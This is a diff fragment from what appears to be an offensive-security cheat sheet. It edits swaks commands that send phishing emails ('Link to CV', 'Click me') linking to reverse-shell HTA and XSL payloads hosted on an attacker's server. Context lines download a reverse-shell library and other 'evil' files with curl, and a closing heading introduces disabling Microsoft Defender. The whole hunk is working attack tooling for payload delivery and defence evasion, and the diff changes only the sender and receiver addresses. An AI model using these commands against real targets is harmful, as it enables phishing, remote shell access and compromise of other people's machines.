@@ -74,10 +74,10 @@ curl http://<ip>:<port>/pl/li-rshell.so -o ./li-rshell.so
 curl http://<ip>:<port>/pl/evil_<file> -o ./evil_<file>
 
 # Send a .HTA payload over E-mail
-swaks --to REPLACE@ME.com --from yeri@foobar.com --server <target> --header "Subject: Link to CV" --body "Click me: http://<ip>:<port>/pl/js-revshell.hta"
+swaks --to <receiver-email> --from test@test.test --server <target> --header "Subject: Link to CV" --body "Click me: http://<ip>:<port>/pl/js-revshell.hta"
 
 # Send a .XSL payload over E-mail
-swaks --to REPLACE@ME.com --from yeri@foobar.com --server <target> --header "Subject: Link to CV" --body "Click me: http://<ip>:<port>/pl/js-revshell.xsl"
+swaks --to REPLACE@ME.com --from test@test.test --server <target> --header "Subject: Link to CV" --body "Click me: http://<ip>:<port>/pl/js-revshell.xsl"
 
 # bypass
 # Disable MS Defender (admin needed)
